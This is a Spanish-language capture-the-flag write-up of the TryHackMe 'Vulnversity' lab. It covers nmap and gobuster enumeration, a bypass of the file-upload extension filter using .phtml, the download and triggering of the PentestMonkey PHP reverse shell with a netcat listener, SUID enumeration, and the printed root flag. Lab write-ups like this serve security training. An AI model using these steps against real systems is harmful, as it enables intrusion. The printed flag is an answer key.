# Vulnversity — Informe Técnico

## Información de la Sala

| Campo | Valor |
|---|---|
| Plataforma | TryHackMe |
| Sala | Vulnversity |
| Dificultad | Fácil |
| Temas | Nmap, Gobuster, File Upload Exploitation, Reverse Shell, Privilege Escalation |

---

# Objetivo

Comprometer el servidor web mediante la explotación de una funcionalidad vulnerable de subida de archivos y escalar privilegios hasta obtener acceso root.

---

# Reconocimiento

## Escaneo Inicial con Nmap

Se realizó una enumeración completa de puertos y servicios utilizando Nmap.

### Comando

```bash
nmap -sC -sV -p- TARGET_IP
```

### Resultados

| Puerto | Servicio | Versión |
|---|---|---|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 |
| 139 | SMB | Samba smbd 4.6.2 |
| 445 | SMB | Samba smbd 4.6.2 |
| 3128 | Proxy HTTP | Squid 4.10 |
| 3333 | HTTP | Apache 2.4.41 |

---

# Enumeración Web

## Descubrimiento de Directorios con Gobuster

Se utilizó Gobuster para descubrir directorios ocultos en el servidor web.

### Comando

```bash
gobuster dir -u http://TARGET_IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Directorio Encontrado

```text
/internal/
```

---

# Explotación de Subida de Archivos

## Análisis del Formulario

Dentro del directorio `/internal/` se encontró un formulario de subida de archivos.

Se utilizó BurpSuite Intruder para fuzzear extensiones y descubrir cuáles eran aceptadas por el servidor.

### Extensiones Probadas

```text
.php
.php3
.php4
.php5
.phtml
```

### Resultado

La extensión `.phtml` fue aceptada.

---

# Generación de Reverse Shell

Se descargó una reverse shell PHP desde el repositorio de PentestMonkey.

### Descarga

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

---

# Configuración del Payload

Se modificó el archivo para establecer la IP atacante y el puerto de escucha.

Posteriormente el archivo fue renombrado.

### Comando

```bash
mv php-reverse-shell.php php-reverse-shell.phtml
```

---

# Listener Netcat

Se inició un listener para recibir la conexión entrante.

### Comando

```bash
nc -lvnp 1234
```

---

# Ejecución del Payload

El archivo `.phtml` fue subido exitosamente y ejecutado mediante:

```text
http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml
```

---

# Acceso Inicial

La reverse shell fue obtenida correctamente.

### Verificación

```bash
whoami
```

### Resultado

```bash
www-data
```

---

# Escalada de Privilegios

## Búsqueda de Binarios SUID

Se buscaron archivos con permisos SUID habilitados.

### Comando

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Binario Sospechoso

```text
/bin/systemctl
```

---

# Explotación SUID

Se utilizó el binario vulnerable para elevar privilegios y obtener acceso root.

---

# Obtención de la Flag Root

### Comando

```bash
cat /root/root.txt
```

### Flag

```text
a58ff8579f0a9270368d33a9966c7fd5
```

---

# Resumen del Ataque

1. Enumeración de servicios con Nmap
2. Descubrimiento del directorio `/internal/`
3. Identificación de subida vulnerable
4. Fuzzing de extensiones con BurpSuite
5. Bypass mediante `.phtml`
6. Obtención de reverse shell
7. Enumeración de privilegios
8. Explotación SUID
9. Obtención de acceso root
10. Captura de la flag

---

# Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| Nmap | Enumeración de servicios |
| Gobuster | Fuerza bruta de directorios |
| BurpSuite | Fuzzing y análisis HTTP |
| Netcat | Reverse shell listener |
| PentestMonkey Shell | Payload reverse shell |
| Linux Commands | Enumeración y privilegios |

---

# Habilidades Practicadas

- Enumeración web
- Directory brute forcing
- File upload exploitation
- Reverse shells
- Linux privilege escalation
- SUID exploitation
- BurpSuite Intruder

---

# Lecciones Aprendidas

- Las validaciones de extensiones pueden ser evadidas.
- Los formularios de subida representan un riesgo crítico.
- Los binarios SUID mal configurados pueden derivar en acceso root.
- La enumeración correcta es clave para la escalada de privilegios.

---

# Conclusión

La máquina fue comprometida exitosamente explotando una funcionalidad vulnerable de subida de archivos. Tras obtener acceso inicial como `www-data`, se identificó un binario SUID vulnerable que permitió elevar privilegios y obtener acceso root completo.
